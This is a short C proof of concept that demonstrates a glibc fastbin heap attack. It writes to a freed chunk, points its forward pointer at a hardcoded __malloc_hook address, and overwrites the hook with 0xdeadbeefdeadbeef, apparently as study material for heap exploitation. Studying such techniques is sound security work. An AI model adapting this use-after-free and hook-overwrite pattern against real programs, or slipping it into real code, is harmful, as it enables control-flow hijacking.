#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __malloc_hook 0x7ffff7dd1b10

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){	
	long size = 0x68;
	long long *p,*q,*r;
	long target_value = 0xdeadbeefdeadbeef;
	char buf2[8] = {0};
	init();
	// init a chunk
	p = malloc(0x68);
	// place p into fast bin
	free(p);
	sleep(0);
	// set p's fd to __malloc_hook - 0x23
	p[0] = __malloc_hook - 0x23;
	sleep(0);
	q = malloc(size);
	sleep(0);
	// malloc twice to get the target chunk
	r = malloc(size);
	printf("%p\n",r);
	sleep(0);
	// write __malloc_hook to 0xdeadbeefdeadbeef
	sprintf(buf2,"%s",(char *)&target_value);
	// padding
	strcpy(r,"aaajunkjunkjunkjunk");
	strcat(r,buf2);
	sleep(0);
	malloc(0);
}

